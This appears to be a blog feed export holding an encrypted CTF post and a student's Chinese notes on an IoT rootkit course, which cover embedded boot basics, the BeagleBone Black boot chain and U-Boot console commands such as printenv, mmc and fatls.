cdeb479ac4c7b993790c0f27813fc49b1609db5727129badbe35c04fad1fadf5118e2876a2111874d0bf5829d478f607e0148fc741ca382afa904e896737e538a8130053ee2a0bd0de2e4b99a04bb41f1a0c0961324826cea6f1efb466499264a4c7b184d9a600b1162b5a244308eadcf4d44239f0f2442c7a15f5a7c460a12d7a120cb1aee1caf514db54f295f19e5ecc321394db317da92538199e6dd8d7b241c9da6d4ab5b6060ad1867c599a5163c0e59da8bc7927300ab702822730e8608dbc56f97ba77f0570acbacc67139585b3399b7bee83feafa6eed805ce7a161860106a00d897848fafa4339d317e27a575aed90f7dd81be53760e833f2b8bfd33cedf7b85c7cf5b83f5bf1997e0d982cee0de439cc5e436ccc62e860cca24ba68cc7df6bf92745e879d0d2c3e6c68f39bb443d225848e4b42b80052f243bdc5bb382f970b3fdf504ab2d8bf0823b658a0e0efa9cb76c869dd7a7664d21fb606f56eeeb7cac21593aaac03f6fe2d599e44e4b2f1305fbf1fd187dd24a70634423a22d27d43eb5d03108133bd588bea7f9525ae5c0c4a19a169d4789d7b4d4f94ebd69624e9a47921706047f39662e46d79bb7055c380446e78c1304baa4333935347af432accc8afffc1d83e8fbbeba7a3423e0916c5ded87c290705e34b2acd064b539747efff4669ab266ac1964b271248adf021516d834780c5882d4d7406840bd3ac17e60bf092653cc6026123cebe45fa3bfb38a164ff5b8944b1a6e4f83a4a6c1474b4aae0ac732561f91bc9997f2eb4eca7c49ca3af7b4c14316c291899de7a10d05c876eadc0ba32b9632c74166b834f6cd1fb1cf4441fb51fc31aa2ea0c184f7e325cbcd7359696017e0dc8110261d0e0a6c4943641c18f96fed1a94c003ba93d258d149ec935c85daf6cda5ea7207dd7164388e6c94c728e43453453eab21df87e2e7c799dde950ee90ffadfa652d5fbf19e06f5f97780cc3d965c3b3cedcc14151b4b8637fa60826ec52626b276b668e4cfe12556f1d49d3a2f9c7163b73db5768f19592d2147dce11798d7ac216bfb82b1d832789915dd1e9f8129aef2d96cbf7a1bbd6a8e48c02916dea18b8d0ec762e3aef4d8f2271e0932147b6b47f6f26c6b27480c31224de41a482c5a42460a2d46ba6a8d70cf30ae9443ac6893e8bd00788b6ddbf019979cbc256fc201d215847288df86757d78125ceaa60ab0018e498bc5b93b653ab45cfe47a921993ce5b9fec8360611625e6961fe65d2632400a0dc5657c870377e3ec80dae18867a715e071431639d26f6e636c1d43e323c30d4b3d7d2378238f84c1ef29f8c4ff0d5ef3b0f9b3da95ec2bc3129e25d4d84dd3d0f555dd7f23a9902aa48899a35942f71267058f52b79acad3931397070909ecec0b94209fbed2e67fb12846e58b32019f80b9cca4e170d446f6e8444aa8861235c2d6bf438217186b827121e0db9619d0ad7fe5c98e29e5bf569a71f7d257c59ea67074e0dd831ada44e874b5b8429116fe56b4c201f22a1938cd033cc347b572f87b677b5609a15518632dfa8c7de65f6f8165e54645deea354a2a61ad45c8649ec6321979bce3a4c2ec464d1db954b95ff5409dc62f077f3f1a5951b1f298718d8c6e272645c16f7469c62031193d6e939ce7722b8be858f80337c187828cda1b4e213cec51eee1602a6765c09bd6172772d9ab5b6b4a151e8733b6d5b234f4027391a1c546bea48c32e46875457887ab0f8fa5840e45ae6a2e83e2b896521bef1ca860119f8d84800aebe2676066445f0b3f574dc572adb6e6210fd79c5b9b1c984585b634a1cf2758531182946bda23dec178da41c0b3cdff21a85f171a8d65f7e2d0c53104b9c72ef049b256711eef6e9bd94d15e38103d31b5b23c9419d8ca5a2a03070d8674525183bbcd2ab8c606c1bf62d249a8d6093b9a09d47f753cecb3537a998360107b66dd9aa9db89c0e00c574bd79bd2553c65384057841704819da4a58c065047f8d71e8b4749dd00581935c5c999a3a3c8c0f597593c8eafceb86909069e742d0f859920c4151575f85cb7629727e8dd535433068a2deeafb258531db00610542e996803e892bbf59f0e654586dcfebae9cfd8bc43812672cf338bf773a608b12103030ab22caaef5be83d5407fe1dd8b46e2be3105ce6ed3bb68c06c359823f0e970dd4f8b92d115d87e6e2a6c1564419405c8daa721532ccf06204f72a1752c74889e71aa38db51f70cf381c4b3bbfeff54d1691f8622ed6303fd544fcfd15b904b94a51b8560be7337ddda7c2093f036809f7d630932d9d4397301e8f4d64a14024624872624e47d5f126089612f561137f8925dfff7f26b0b67227a45a94fa8245ff860c8ce26b51a315c77a2ab1fb0c6a5f725f8d64199c1bbbd3ae9de156ac9f36eac69293458b852b686048ec40c8f6e7bc7dfefd5710257d661e462f5f4cb34882cdc357aeaf45222721604aabfae3720b84e6a71ac5021cde1599de3b4af45579834b4c3a40e568ac70bdd63bf740cbe8f41dae3b130c9d09dbe578b7415ce848fe688736e9af780885ec2da7e9082e37cef9efe6f17db9b8250e49e6516e3a573544292f426988afb9c5a607d4808010e17a5f5e6c629798d3f3c9f2ae9d103a2fd0ec86d64dcfde2c33ee7178c735b01690f5059c9002676e393f8f791f3858d64cd8e55cd377fb1b717a6270260f659329c001149a67a5f20c68adef26de9c81815ea7cb28f5130bc55aec81fbe4ace4bb87093a042b0c18bc6398330712538d8d63bf951692057d201d32bfb176de2895e9d43667e48e5d17e929251104be94a54265d91828afcde2275e950056403ea1029fb1f382779a6e2696a79b1d718b030c82009fafa2d4ddd4cab6ee946545f865898ea3e7ef3c45efe7419af29cc18286b92174e292c3a6ddd284baddd1a0f93bb909f9b238f78ad9007e09785353c195ceff294dc0314902e535b1a3b98dade8bb3235e7c30cccdadd33a200c8997c7ab60f1f2f398d46514e0f4fcda0fefe211b8e0fd45a402f29ffcbc9d5a68ffc7d0d6179ef9e2b182a99619c97c49e4f51cee99b8489cac661ec2899c82ddfde67cfdda51cebf4afde54d9b8e31f007bd38d2a81bcf2b7f33f2d8ab451bce74f69592724f3317cc6d153aca7142b9a5e599bcbecdbef2cd70928b7c23227fde207b313b7b3ed60313c7d55478bc8b48d093101da52a424548610856b5754f957dac966aebcfa8f02a329a1811bdf45f525bd9b48abc18dd7908a0bb459e7596ad491e9c4c30109ac459c26681da47c928258d87a2106ef20accb2b847920759ff0885d896cc478b95c7811ae17a926ca4cc0f3e34903237803aafffe6ec07fa1fb95c5dc7bb5132ba2e39cab1946495105abb2dbae40edd4761c7caf88c65b2c0b1f98cd9c42084ae7096d7ca108257c0442844cbbdbccb52b158910f4922752573b507c1d320b0f5e77ccbbc959b78051e274f0d7f04db626f25929baa60bfce97802f5b261c16f431b72469fdb53af8e60a1e816aee5fc3f0c4edcd8ebd3b8c5d549ed6f0dc325e7b913698a4aad5cc5486f5a077baa36c7bdb93d4d4f93b2792e780e2fb9a54d9c269e6048d5ab3958e5f5dd8a0e2969ac134f3e90a4b0d75ebbe6c7417ce81af6d9a76092eee8edfd86ef3bd685075a659aa8cf3124cd21a848af6f216e29a47dcc3df8d79f44be90826289a8ad8045bfca50301fb858aebb7b5c3f5259cf536eb77e0da7ac0c805329c8621ea365d1cc1f8af6d4e8d0a76c5320bc7967c3511564f522f1e91c3f869995cff41d519b7dff346a721ce0f179962fe9a96d05bb4de87846bf81199f715c8916c1d560055506c945f56e3eae5d8d37b4202707c277bb47ba5377dfc0d45b7b4c026aba92ff5986434170387b83bfce42ec31b3ef79fa140eba476ef858b5abef4b7526cf8eb7ac742b2daf6246957665503a0a8cef5dee5f01c1838662641a33fabf80c04cf13dcba174da87cba39e0d37fccc97ee9019419eb5d55556623a2577cf1b4b0fe028ab7e1035d02b61139930cc369ad68a165ddacf6e6c35cb35393dc8db7a93443bcd3ae0be6f064fdd5a2a8fc2ea89db1b81500f370f1fe4bdff05a06d158ed5d4e73574aff14a1154485a732d7fff95d04ea6fff2c7132e98448dfa8b91a4ac3c98924bf6595603452f7796bca44a4c079e8391237aa892e63cc1e40666c5967b8c0fce92e06b1f41fcdd43a91497e7ef7958a57d17ee5bee133c5ccfa714a5287151462e3325dcd677f5344c71a8d4a7987dd692af8725106f58f44799143d4989278d2eb770d8a41a3b0b72852d70ecf741c2fa820fadb03bb3dc9d469bccb89dfb7e9222845aebd65db06582ba9e744083cb00cfabc3c70f97cae8e24a0ef44616fe4375fbae90ae1a39f0e115b8e95ef635fa25987f33e7f2a9cb76da6eba4c4c2ec27532257174eaf169600298dc4f7bfaa47125f74f0bc016f7f88ae7c8aa3c47dfc0c687d75c7efaa13f20c72bf5e0f8ec3758a076e1745c73eeaeb0e3ff639140f37b9c7448b66a5795e40fda031f7322bf1b208182fdbba793d99ce948cb6805619882bd0f7a98d1bc2207589e72d45c7c12ccf83e65158088b71b026b0a5eaef4d89c1afbedf152e522ffb4b98ee1792d2127dd33b06f8ee52ee5869727f0c0661b71154c953dbfc00fb3e72b871150e090311d2a4283802a2df7a807084f3db49c829d85b3f8a7f35e76aca9f4462ea496a887c1b0b231f349bcb41abd5b716bbcf2fda65d78bf62dde76fe7e7b070732ff5143e5bdc25bbf90df5667ba597dec79418fb7913b25853ca7f76b5e14f98501ca8a130145d14affc0caa7cf7bbb735466adf695240a9e53d44310b7b45842721c0a182be9178a06a118cbab7758c46ca325f4e8b624745b52c36c6c872a098189202aebe428c5cd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好!此文章已被皮三宝加密，您可以选择当面py或者爆破密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习(week 1-3)</title>
    <link href="/2019/03/06/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1-3/"/>
    <url>/2019/03/06/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1-3/</url>
    
    <content type="html"><![CDATA[<p>一周的学习马上就要结束啦~<br>大概看了下这个视频讲的东西<br>都是关于深入了解U-Boot的<br>具体讲的都是里面的指令啊啥的</p><a id="more"></a><h1 id="Sart-your-engine"><a href="#Sart-your-engine" class="headerlink" title="Sart your engine"></a>Sart your engine</h1><h2 id=""><a href="#" class="headerlink" title="?"></a>?</h2><p><img src="1.png" alt="1"><br>首先输入<br>这个命令是用来查看U-Boot有哪些命令并可以查看U-Boot命令的大概意思</p><h2 id="printenv"><a href="#printenv" class="headerlink" title="printenv"></a>printenv</h2><p><img src="2.png" alt="2"><br>这个命令呢<br>打印出来了一大堆东西，但基本都是关于环境变量的<br>还有很多U-Boot有的基本信息<br>//作者还说以后攻击者可以利用这些东西<br>//好兴奋啊</p><h2 id="bdinfo"><a href="#bdinfo" class="headerlink" title="bdinfo"></a>bdinfo</h2><p><img src="3.png" alt="3"><br>bdinfo么就是board information<br>主要就是一些东西的地址<br>其中有些东西对攻击者很有用</p><h2 id="mmc-help"><a href="#mmc-help" class="headerlink" title="mmc help"></a>mmc help</h2><p><img src="4.png" alt="4"><br>和上面’?’类似<br>只不过是给出了mmc命令<br>mmc也就是多媒体存储卡//可以理解为类似sd卡的东西<br>//其实也就是sd卡的前生<br>通过mmc help可以看到很多mmc的命令<br>比如mmc rescan重新扫描mmc设备啥的</p><h2 id="mmc-list"><a href="#mmc-list" class="headerlink" title="mmc list"></a>mmc list</h2><p><img src="5.png" alt="5"><br>也就是列出来mmc设备<br>这边可以看到有俩个mmc设备<br>一个是我们插入的sd卡，也就是第一个<br>还有一个是BBB内部的自带mmc</p><h2 id="mmc-info"><a href="#mmc-info" class="headerlink" title="mmc info"></a>mmc info</h2><p><img src="6.png" alt="6"><br>输入这个命令呢是告诉我们<br>当前选中的mmc设备的信息<br>也就是我们插入的sd卡</p><p>ok<br>接下去来看看怎么查看其他的设备<br>也就是内部的mmc</p><h2 id="mmc-dev"><a href="#mmc-dev" class="headerlink" title="mmc dev"></a>mmc dev</h2><p>不上图了<br>这个命令就是告诉你哪个mmc设备是当前的设备<br>那怎么把内部的mmc设置为当前的设备呢<br>我们只需要敲入<br>mmc dev 1</p><h2 id="mmc-dev-1"><a href="#mmc-dev-1" class="headerlink" title="mmc dev []"></a>mmc dev []</h2><p>[]里面是设备的标号<br>具体标号可以用mmc list查看<br>这个命令把内部的mmc设置成了当前设备<br>接着就可以敲入mmc info查看信息了</p><p>接下去再把mmc切回sd卡<br>继续学习。。。</p><h2 id="mmc-part"><a href="#mmc-part" class="headerlink" title="mmc part"></a>mmc part</h2><p><img src="7.png" alt="7"><br>这个命令展示的是当前mmc设备上的分区<br>//不怎么确定part是不是分区的意思</p><h2 id="fstype"><a href="#fstype" class="headerlink" title="fstype"></a>fstype</h2><p><img src="8.png" alt="8"><br>file system type<br>使用方法呢就是<br>fstype mmc []:[]<br>俩个里面都是标号<br>第一个是mmc标号<br>第二个是mmc里面分区的标号</p><p>接下去作者就开始讲关于里面分区的命令了<br>比如说fat<br>输入fat可以出现很多关于fat的命令</p><h2 id="fatinfo"><a href="#fatinfo" class="headerlink" title="fatinfo"></a>fatinfo</h2><p>用法fatinfo [] []:[]<br>第一个里面填写设备比如说mmc<br>第二个是设备编号<br>第三个是设备中分区编号</p><h2 id="fatls"><a href="#fatls" class="headerlink" title="fatls"></a>fatls</h2><p><img src="9.png" alt="9"><br>不用多说<br>这边讲讲用法<br>其实和上面的fatinfo是一模一样的<br>比如说<br>fatls mmc 0:1<br>这边列出来的其实就是我们往sd卡中<br>fat32部分放的东西</p><p>然后作者说了还有很多用法比如说fatload啊什么的<br>还说给我们布置个小练习让我们自己去了解<br>//说白了太懒了不想一个一个在视频里讲解<br>//我自己看的都发困了</p><h2 id="ext4ls"><a href="#ext4ls" class="headerlink" title="ext4ls"></a>ext4ls</h2><p>用法同上<br>可以列出来选定部分放的文件啥的</p><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>用法<br>ls [] []:[]<br>比如 ls mmc 0:1<br>然后发现结果其实和刚刚那个<br>fatls mmc 0:1<br>是一样一样的<br>//黑人问号.jpg<br>//这么好的东西居然放到最后讲</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个视频呢主要还是要教我们怎么和U-Boot交互<br>还有一些U-Boot的命令啊<br>啥的<br>这边也提了好像是说加载到U-Boot里的Bootkit<br>有和U-Boot一样的功能啊来监视这些东西<br>即使操作系统加载后<br>也可以这样</p><p>ok<br>学习结束</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习(week 1-2)</title>
    <link href="/2019/03/05/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1-2/"/>
    <url>/2019/03/05/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1-2/</url>
    
    <content type="html"><![CDATA[<p>在上期视频结尾记得作者说什么<br>以后保证每期视频时间在15分钟以内<br>可把我高兴坏了<br>然后看到这期视频长达近1小时。。。</p><a id="more"></a><h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p><img src="1.png" alt="1"><br>启动BBB后出现的<br>首先是U-Boot(这边主要是来验证上节课说的理论)<br><img src="2.png" alt="2"><br>这边可以看到U-Boot在寻找uEnv.txt凭此来定位Linux内核<br><img src="3.png" alt="3"><br>可以看到uEnv.txt加载后找到了内核和设备树的位置<br>然后开始引导内核<br>接着就是文件系统<br>然后可以看到登录<br>账号密码全部告诉你了<br><img src="4.png" alt="4"></p><h2 id="Booting-BBB-from-external-SD-card"><a href="#Booting-BBB-from-external-SD-card" class="headerlink" title="Booting BBB from external SD card"></a>Booting BBB from external SD card</h2><p><img src="5.png" alt="5"><br>这边就不翻译了，要先把sd卡插入BBB<br><img src="6.png" alt="6"><br>这边的话是只在SD卡中放MLO<br>从上节课所学到的可以知道，当SOC Booting开始后，ROM先找到MLO把他放进soc的内部RAM中<br>然后MLO去找U-Boot，这部分因为只有MLO，所以寻找肯定会失败。<br>接着作者开始实验了<br><img src="7.png" alt="7"><br>首先是对SD卡进行划分文件系统<br>然后对划分部分开始进行一些设置<br>下面就是吧MLO拷进FAT32部分<br>//MLO在视频附赠的文件当中<br>接下去就是按着作者步骤来走呗<br><img src="8.png" alt="8"><br>结果呢也不出所料，失败了，毕竟只有MLO<br>这边有重启操作，是因为WDT<br>WDT的时间好像是3分钟<br>//具体看上一篇blog<br>做完这个实验后，作者又把U-Boot拷进了SD卡<br>然后重复操作<br>//其实这个视频大部分时间就是为了通过实践让你更好理解Booting Process<br>好了<br>重复操作部分不记录了，来看看结果<br><img src="9.png" alt="9"><br>这次就成功找到U-Boot了<br>找到后MLO把控制权给U-Boot<br>OK<br>U-Boot开始运行，上节课也讲过，U-Boot是要寻找uEnv.txt来定位内核还有设备树<br>肯定是没找到啦//根本就没放进去<br>然后就是失败，开始寻找其他待处理的设备<br>到这你以为实验结束了？？？<br>太天真了<br>作者接下去又要重复操作，把uEnv.txt放入SD卡<br>然后可以猜想这个视频接下去会是什么样。。。<br>这边来说一下什么是uEnv.txt<br>uEnv.txt里面包含了U-Boot所需要的环境啥的<br>然后U-Boot利用这些来改变自己的配置并决定要引导什么东西和怎么引导<br><img src="10.png" alt="10"><br>上图是那个txt文件里的东西<br>//这边没听懂<br>//就不解释了<br>//但是作者会在下个视频细谈这个文件<br>ok<br>继续讲实验<br><img src="11.png" alt="11"><br>这次就成功加载那个txt了<br>可以看到作者自己的广告<br>有空去研究下把这广告删了改成自己的<br>//当我打完这行字的时候作者说自己在当年也喜欢干这种蠢事<br>//手动滑稽.png<br>再看下面也可以发现File not found<br>毕竟没有放啥内核和设备树在SD卡里面。。。<br>//估计下一个实验就是放这些<br>//然后重复操作<br>//无限循环<br>所以就失败了<br>和上一次一样<br>开始寻找还有没有什么其他的设备<br>好了，现在在把Linux  kernel还有device tree啥的放进sd卡内<br>再次启动<br><img src="12.png" alt="12"><br>可以看到内核还有设备树都被拷贝和加载了<br>U-Boot把控制权给与内核，内核开始运行代码<br>主要就是初始化一堆东西，初始化完后就开始运行根文件系统<br>即root file system<br>然后失败了<br>毕竟在第三个划分区中啥也没放。。。<br>这边提了一下所谓的root file system就是我们用的目录<br>太棒了，总算到最后一个实验了<br>也就是把Root Filesystem放进SD卡里<br>完整的跑一次<br>然后<br>成功<br><img src="13.png" alt="13"><br>结束了<br>50多分钟视频<br>说实话，这一期比较简单<br>//要是上一期稍微认真理解的话<br>大部分都是通过实验来演示Boot Process</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习(week 1-1)</title>
    <link href="/2019/03/03/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1/"/>
    <url>/2019/03/03/iot-rootkit-%E5%AD%A6%E4%B9%A0-week-1/</url>
    
    <content type="html"><![CDATA[<p>记录下week1的学习</p><a id="more"></a><h1 id="Embedded-Linux-Boot-Process"><a href="#Embedded-Linux-Boot-Process" class="headerlink" title="Embedded Linux Boot Process"></a>Embedded Linux Boot Process</h1><p><img src="1.png" alt="1"></p><h2 id="soC-ROM-Bootloader"><a href="#soC-ROM-Bootloader" class="headerlink" title="soC ROM Bootloader"></a>soC ROM Bootloader</h2><p>当soc被启动时首先启动reset vector——复位向量<br>这是制造商提前编程好的东西<br>然后会吧控制权给soC ROM Bootloader<br>soC ROM Bootloader会启动一些基本硬件<br>然后开始在Boot Device中寻找First Stage Bootloader，并把控制权给予First Stage Bootloader</p><h2 id="First-Stage-Bootloader"><a href="#First-Stage-Bootloader" class="headerlink" title="First Stage Bootloader"></a>First Stage Bootloader</h2><p>First Stage Bootloader会找到Second Stage Bootloader<br>并将其载入RAM中，然后把控制权转移给Second Stage Bootloader</p><p>这边作者也提及了一些注意点<br>比如说pass control而不是call<br>因为如果是call的话，在运行结束后会return<br>而事实不是这样，当First Stage Bootloader将控制权给Second Stage Bootloader后<br>要等到下一次启动，First Stage Bootloader才会启动<br>还有关于stage的，这边只提及有俩个阶段，然而事实上这都要依赖于嵌入式系统，没准有很多阶段。</p><h2 id="Second-Stage-Bootloader"><a href="#Second-Stage-Bootloader" class="headerlink" title="Second Stage Bootloader"></a>Second Stage Bootloader</h2><p>Second Stage Bootloader的责任是把内核还有设备树载入到RAM中<br>然后根据自己的配置，启动内核还有内核引导程序后把控制权给Linux Kernel</p><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>内核会初始化许多硬件，然后寻找引导程序并定位Root Filesystem,然后运行他<br>如果运行成功内核会在Root Filesystem中寻找初始化程序<br>//后面没听懂作者在讲啥，英语有点渣</p><h1 id="BBB"><a href="#BBB" class="headerlink" title="BBB"></a>BBB</h1><p>//作者在这边吐槽惊叹了很多</p><h2 id="AM3358"><a href="#AM3358" class="headerlink" title="AM3358"></a>AM3358</h2><p><img src="2.png" alt="2"><br>176kb ROM<br>64kb RAM<br>64kb shared RAM<br>存储器不怎么大<br>//这边后面会解释原因<br>//成本问题</p><h2 id="Public-Bootrom-Architecture"><a href="#Public-Bootrom-Architecture" class="headerlink" title="Public Bootrom Architecture"></a>Public Bootrom Architecture</h2><p><img src="3.png" alt="3"><br>作者在这边讲的大概是关于这玩意的硬件支持和软件支持</p><h2 id="ROM-Bootloader-Init"><a href="#ROM-Bootloader-Init" class="headerlink" title="ROM Bootloader Init"></a>ROM Bootloader Init</h2><p><img src="4.png" alt="4"><br>首先是系统的启动然后初始化了许多基础的东西<br>然后进入主程序(main routine)把栈建立<br>接着会启动看门狗定时器(WDT)<br>这边来解释下WDT<br>看门狗定时器（WDT，Watch Dog Timer）是单片机的一个组成部分，它实际上是一个计数器，一般给看门狗一个数字，程序开始运行后看门狗开始倒计数。如果程序运行正常，过一段时间CPU应发出指令让看门狗复位，重新开始倒计数。如果看门狗减到0就认为程序没有正常工作，强制整个系统复位。___from baidu<br>WDT倒计时是3min<br>给引导程序来寻找First Stage Bootloader<br>WDT完事后就是设置时钟<br>接着就是引导下一阶段</p><p>下面作者讲的大概是在ROM Bootloader Init完后是如何启动各种设备的</p><h3 id="ROM-Bootloader-Device-Boot-Order"><a href="#ROM-Bootloader-Device-Boot-Order" class="headerlink" title="ROM Bootloader: Device Boot Order"></a>ROM Bootloader: Device Boot Order</h3><p><img src="5.png" alt="5"><br>至于引导下一阶段，首先要找到下一阶段在哪？<br>首先肯定不在系统芯片内，因为系统芯片AM3358的ROM没有那么大<br>所以必须在外部寻找<br>那如何找呢？<br>这是由设计者通过某种方式来让ROM Bootloader知道如何引导下一阶段。。。<br>//其实是我没听懂<br>//但看流程图的话，貌似是一个一个的寻找<br>//直到定位到就停下<br>//否则失败</p><h3 id="ROM-Bootloader-MMC-SD-Caed-Booting"><a href="#ROM-Bootloader-MMC-SD-Caed-Booting" class="headerlink" title="ROM Bootloader: MMC/SD Caed Booting"></a>ROM Bootloader: MMC/SD Caed Booting</h3><p><img src="6.png" alt="6"><br>ROM Bootloader初始化驱动，然后根据俩种模式来定位First Stage Bootloader<br><img src="7.png" alt="7"><br>可以看到有俩种寻址方法<br>第一种是根据特定的偏移位<br>第二种是啥我也没听懂。。。正在询问老师中<br>//吐槽一下下这口音，把MLO听成了”M雷罗”,我也是醉了<br>//感觉这堆视频看完英语6级听力不用愁(flag)</p><h2 id="BBB-Boot-Process"><a href="#BBB-Boot-Process" class="headerlink" title="BBB Boot Process"></a>BBB Boot Process</h2><p><img src="8.png" alt="8"><br>这边是个总结<br>soC ROM Bootloader 就是在那个AM3358里的<br>工作主要是加载下一阶段的引导，主要是SPL和MLO<br>然后First Stage Bootloader会加载Second Stage Bootloader<br>使用的引导方式是U-boot<br>配置文件是uEnv.txt<br>接着就是引导Linux内核和设备树文件啥的<br>最后就是整个文件初始化系统进程</p><h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>总算熬到最后了<br><img src="9.png" alt="9"><br>可以看到左边是那个芯片<br>RAM 128KB<br>ROM 176KB//具体可看上文<br>还有是我们的SD卡<br>和系统的RAM<br>当我们插入SD卡的时候有三个划分<br>可以看到就是图8的那上面三个<br>好了，开始总结</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>首先启动芯片<br>ROM Bootloader开始运行，第一步他会在sd卡中寻找FAT32<br>然后找然后从中找到MLO，把他肛进RAM<br>完事<br>如果没有找到MLO<br>他会放弃，然后寻找还有啥设备<br>总结一下，第一步就是找到MLO，把MLO肛进RAM,接着把控制权给MLO</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>然后MLO会找到U-Boot，并把它肛进系统的RAM<br>然后U-Boot会找到uEnv.txt，同样也是肛进系统的RAM<br>然后U-Boot会接着找到Linux内核和设备树<br>至于怎么找//因为由俩个EXT4嘛<br>其实这些信息都在uEnv.txt中<br>U-Boot把Linux内核和设备树肛进系统的RAM<br>并引导，然后把控制权给内核<br>内核会运行Root Filesystem，然后运行在系统RAM的初始化程序<br>然后初始化程序会初始化用户空间进程</p><h3 id="解答问题"><a href="#解答问题" class="headerlink" title="解答问题"></a>解答问题</h3><h4 id="1-要MLO有个卵用？为什么不直接把U-Boot肛进RAM然后运行？"><a href="#1-要MLO有个卵用？为什么不直接把U-Boot肛进RAM然后运行？" class="headerlink" title="1.要MLO有个卵用？为什么不直接把U-Boot肛进RAM然后运行？"></a>1.要MLO有个卵用？为什么不直接把U-Boot肛进RAM然后运行？</h4><p>因为存储器不够大，而U-Boot太大了<br>成本太贵。。。只能这样<br>估计用的是SRAM</p><h4 id="2-既然不能直接载入soc内部RAM，为什么不直接载入系统RAM呢？"><a href="#2-既然不能直接载入soc内部RAM，为什么不直接载入系统RAM呢？" class="headerlink" title="2.既然不能直接载入soc内部RAM，为什么不直接载入系统RAM呢？"></a>2.既然不能直接载入soc内部RAM，为什么不直接载入系统RAM呢？</h4><p>因为系统芯片不知道你的外设是啥<br>ROM Bootloader不知道如何把U-Boot载入系统RAM<br>但是MLO知道<br>所以可以通过MLO来间接把U-Boot肛进系统RAM</p><h1 id="喜大普奔"><a href="#喜大普奔" class="headerlink" title="喜大普奔"></a>喜大普奔</h1><p>30多分钟视频看了2天<br>总算稍微看懂点了<br>起码不是一脸懵逼<br><img src="10.png" alt="10"></p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot rootkit 学习(week 0)</title>
    <link href="/2019/03/02/iot-rootkit-%E5%AD%A6%E4%B9%A0-0/"/>
    <url>/2019/03/02/iot-rootkit-%E5%AD%A6%E4%B9%A0-0/</url>
    
    <content type="html"><![CDATA[<p>这一篇blog主要记录一下iot rt的基础知识学习<br>入门文章啦<br>iot rt也是最近在做的项目<br>挺难的。。。起码比高数大物难。。。<br>//所以打ctf的时间减少了。。。</p><a id="more"></a><h2 id="What-is-Embedded-System"><a href="#What-is-Embedded-System" class="headerlink" title="What is Embedded System"></a>What is Embedded System</h2><p>嵌入式系统是嵌入式计算机系统的简称。顾名思义，它是一种嵌入在设备/系统内部，为特定应用而设计开发的专用计算机系统。英国电气工程师协会(Institution of Electrical Engineers,IEEE)从应用的角度定义嵌入式系统是“控制、监视或协助设备、机器、工厂运行的装置”(devices used to control, monitor, or assist the operation of equipment machinery or plants)。___from wikibooks<br>据我了解的话，嵌入式系统就是为了达成某项任务而专门设计制作的系统，这也能大大降低成本有效利用资源。<br>比如说mp3，还有游戏机，电子钟表啥的。<br>简单来说可以理解为只有单一的目的计算机就是Embedded System。</p><h2 id="What-is-ROM-and-RAM"><a href="#What-is-ROM-and-RAM" class="headerlink" title="What is ROM and RAM"></a>What is ROM and RAM</h2><p>RAM即Random Access Memory<br>也就是随机存取存储器<br>//记得在上学期计算机导论课里老师提到过，有点印象<br>RAM在每次开关机时记录的东西都会消失，也就是具有易失性，一旦断电，里面的东西都会消失，这点不像ROM<br>而且RAM需要不停的刷新//这些我记得老师上课都讲过，主要是为了防止数据出错<br>但不是所有RAM都要不断刷新<br>RAM还分为SRAM和DRAM</p><h3 id="SRAM"><a href="#SRAM" class="headerlink" title="SRAM"></a>SRAM</h3><p>SRAM不需要刷新，但是断电后里面的东西还是会消失<br>SRAM读取速度更快，但是由于价格很昂贵所以不能配太多，<br>一般电脑里的SRAM都是为了让cpu运行效率更高。<br>但大部分还都是DRAM，也就是我们常说的内存了</p><h3 id="DRAM"><a href="#DRAM" class="headerlink" title="DRAM"></a>DRAM</h3><p>DRAM因为价格较低，一般都做为主存//即内存<br>其访问速度会比SRAM慢</p><h2 id="What-is-uClibc"><a href="#What-is-uClibc" class="headerlink" title="What is uClibc"></a>What is uClibc</h2><p>在计算术语中，uClibc 是一个面向嵌入式Linux系统的小型的C标准库。最初uClibc是为了支持uClinux而开发，这是一个不需要内存管理单元的Linux版本，因此适合于微控制器系统（uCs；此处”u”是代表”micro”的μ的罗马化）. ___from wiki<br>就是c标准库嘛<br>但uClibc主要是针对Embedded System的，所以有些取舍</p><h2 id="What-is-BIOS"><a href="#What-is-BIOS" class="headerlink" title="What is BIOS"></a>What is BIOS</h2><p>BIOS（Basic Input/Output System的缩写、中文：基本输入输出系统），在IBM PC兼容系统上，是一种业界标准的固件接口。[1]。BIOS这个字眼是在1975年第一次由CP/M操作系统中出现。BIOS是个人计算机启动时加载的第一个软件（实际上自Intel Haswell平台以后，UEFI BIOS并不是系统引导时第一个被加载的软件）。</p><p>BIOS用于计算机/PC平台引导时运行系统各部分的自我检测（Power On Self 